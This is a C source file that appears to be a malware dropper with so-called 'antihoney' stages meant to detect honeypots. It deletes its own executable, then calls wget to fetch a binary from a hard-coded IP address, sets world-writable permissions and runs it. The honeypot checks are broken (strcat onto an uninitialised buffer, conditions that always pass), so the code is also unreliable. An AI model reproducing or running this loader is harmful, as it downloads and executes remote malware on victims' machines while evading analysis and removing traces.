#include "stdlib.h"
#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <fcntl.h>
#include <signal.h>


int main(int argc, char **args)
{	

    char string[1024];


	DIR *dir;
	#ifdef DEBUG
	printf("[antihoney] setting up stage 1\n");
	#endif

    // delete
    unlink(args[0]);

    sleep(2);
	if(dir = opendir("/proc/"));

    else{
       printf("[antihoney] failed stage 1 honeypot detected!\n");
        exit(0);
    }

    #ifdef DEBUG
    printf("[antihoney] setting up stage 2\n");
    #endif
    sleep(2);


	if (strcat(string, "/cpuinfo"));

	else{ 
    sleep(1);
    #ifdef DEBUG
    printf("[antihoney] failed stage 2 honeypot detected\n");
    #endif
    exit(0);
}



	#ifdef DEBUG
	printf("[antihoney] setting up stage 3\n");
	#endif

    sleep(2);

	if(strcat(string, "/cpuset"));

	else{

    #ifdef DEBUG
    printf("[antihoney] failed stage 3 honeypot detected\n");
    #endif
    sleep(1);
    exit(0);
}


    #ifdef DEBUG
    printf("[antihoney] no honeypot detected. selfkilling and setting up to download real bin\n");
    #endif
    system("wget http://185.105.4.242/wrgjwrgjwrg246356356356/n12; chmod 777 *; ./n12 wget.echo.telnet.m68k");


    sleep(2);

    #ifdef DEBUG
    printf("[antihoney] killing self now\n");
    #endif

    close(dir);
    exit(0);

}



